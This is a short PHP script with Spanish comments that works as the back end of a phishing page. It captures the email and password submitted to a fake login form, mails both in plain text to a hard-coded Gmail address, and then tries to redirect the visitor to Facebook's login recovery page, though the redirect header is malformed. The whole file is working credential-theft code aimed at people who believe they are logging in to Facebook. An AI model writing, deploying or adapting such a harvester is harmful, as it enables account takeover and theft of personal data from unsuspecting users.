<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Captura los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Validación (puedes agregar más validaciones aquí)

    // Configura el destinatario del correo
    $destinatario = "cieloexenes@gmail.com";

    // Crea el contenido del correo
    $mensaje = "Email: $email\n";
    $mensaje .= "Contraseña: $password\n";

    // Envía el correo (considera usar una biblioteca de envío de correos)
    mail($destinatario, "Formulario de inicio de sesión", $mensaje);

    // Redirige al usuario a una página de confirmación
    header("facebook.com/login/identify/");
    exit; // Termina la ejecución del script
}
?>
